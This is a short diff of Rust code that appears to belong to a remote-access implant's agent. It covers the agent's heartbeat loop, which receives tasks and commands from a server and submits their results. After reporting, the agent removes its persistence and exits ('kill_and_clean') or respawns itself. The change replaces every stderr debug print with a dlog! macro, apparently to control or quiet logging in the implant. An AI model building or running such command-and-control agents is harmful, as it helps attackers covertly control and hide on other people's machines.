@@ -37,7 +37,7 @@ pub(crate) async fn heartbeat_tick(
 ) -> Result<(), String> {
     let task = http.heartbeat(agent_id, session_key).await?;
     if let Some(ref task) = task {
-        eprintln!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
+        libra_common::dlog!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
             task.id,
             task.command_type,
             task.command,
@@ -72,19 +72,19 @@ pub(crate) async fn heartbeat_tick(
             ),
         };
 
-        eprintln!("[SEND] task_result | id={} | len={}", task.id, result.len());
+        libra_common::dlog!("[SEND] task_result | id={} | len={}", task.id, result.len());
         let _ = http.submit_result(agent_id, &result, session_key).await;
 
         // Self-destruct / self-restart happen *after* the result is submitted,
         // so the server records the task as completed and the agent then exits.
         match exit_action {
             ExitAction::Destroy => {
-                eprintln!("[kill_and_clean] removing persistence and exiting");
+                libra_common::dlog!("[kill_and_clean] removing persistence and exiting");
                 crate::persistence::PersistenceManager::cleanup();
                 std::process::exit(0);
             }
             ExitAction::Restart => {
-                eprintln!("[restart] spawning self and exiting");
+                libra_common::dlog!("[restart] spawning self and exiting");
                 spawn_self();
                 std::process::exit(0);
             }
@@ -101,13 +101,13 @@ fn spawn_self() {
     let exe = match std::env::current_exe() {
         Ok(e) => e,
         Err(e) => {
-            eprintln!("[restart] current_exe failed: {e}");
+            libra_common::dlog!("[restart] current_exe failed: {e}");
             return;
         }
     };
     match std::process::Command::new(&exe).spawn() {
-        Ok(_) => eprintln!("[restart] child spawned: {}", exe.display()),
-        Err(e) => eprintln!("[restart] spawn failed: {e}"),
+        Ok(_) => libra_common::dlog!("[restart] child spawned: {}", exe.display()),
+        Err(e) => libra_common::dlog!("[restart] spawn failed: {e}"),
     }
 }
 
